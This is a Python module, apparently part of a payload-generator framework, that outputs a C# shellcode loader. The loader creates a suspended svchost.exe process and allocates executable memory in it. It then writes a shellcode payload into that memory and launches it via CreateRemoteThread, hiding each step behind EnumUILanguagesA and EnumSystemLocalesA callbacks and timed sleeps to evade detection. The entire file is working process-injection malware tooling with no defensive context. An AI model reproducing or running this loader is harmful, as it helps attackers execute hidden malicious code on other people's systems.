from string import Template

class asynccallback:
    def __init__(self, arguments):
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return ["using System;",
                "using System.Collections.Generic;",
                "using System.Linq;",
                "using System.Text;",
                "using System.Threading.Tasks;",
                "using System.Diagnostics;",
                "using System.Runtime.InteropServices;"]

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return Template("""

        public enum ProcessAccessFlags : uint
        {
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VMOperation = 0x00000008,
            VMRead = 0x00000010,
            VMWrite = 0x00000020,
            DupHandle = 0x00000040,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            Synchronize = 0x00100000,
            All = 0x001F0FFF
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000
        }
        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x0040
        }
        [DllImport("kernel32.dll")]
        private static extern bool EnumSystemLocalesA(AsyncSteps ops, uint dwFlags);
        [DllImport("kernel32.dll")]
        private static extern bool EnumUILanguagesA(AsyncSteps ops, uint dwFlags, IntPtr lParam);
        [DllImport("kernelbase.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("kernelbase.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernelbase.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernelbase.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        public static IntPtr hProcess = IntPtr.Zero;
        public static byte[] payload;
        public static int pid = System.Diagnostics.Process.GetCurrentProcess().Id;
        public static bool modes = false;
        
        public static void _Step1_()
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            CreateProcess(null!, "$target", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null!, ref si, out pi);
            hProcess = pi.hProcess;
        }
       
        public static IntPtr buffer = IntPtr.Zero;

        public static void _Step2_()
        {
            buffer = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)payload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
        }

        public static void _Step3_()
        {

            UIntPtr BS = UIntPtr.Zero;
            bool test = WriteProcessMemory(hProcess, buffer, payload, (uint)payload.Length, out BS);

        }
        public static IntPtr hThread = IntPtr.Zero;
        public static void _Step4_()
        {
            IntPtr threadId;
            hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, out threadId);
            CloseHandle(hThread);
            CloseHandle(buffer);
        }
            
        public delegate void AsyncSteps();
""").substitute(target=self.target)



    def template(self) -> str:
        return """
            AsyncSteps CsharpMethod1 = new AsyncSteps(_Step1_);
            AsyncSteps CsharpMethod2 = new AsyncSteps(_Step2_);
            AsyncSteps CsharpMethod3 = new AsyncSteps(_Step3_);
            AsyncSteps CsharpMethod4 = new AsyncSteps(_Step4_);
            {transformers}
            payload = shellcode;
            System.Threading.Thread.Sleep(2000);
            bool Async1 = EnumUILanguagesA(CsharpMethod1, 0, IntPtr.Zero);
            System.Threading.Thread.Sleep(3000);
            bool Async2 = EnumSystemLocalesA(CsharpMethod2, 0);
            System.Threading.Thread.Sleep(5000);
            bool Async3 = EnumSystemLocalesA(CsharpMethod3, 0);
            System.Threading.Thread.Sleep(5555);
            bool Async4 = EnumUILanguagesA(CsharpMethod4, 0, IntPtr.Zero);
            System.Threading.Thread.Sleep(5000);
"""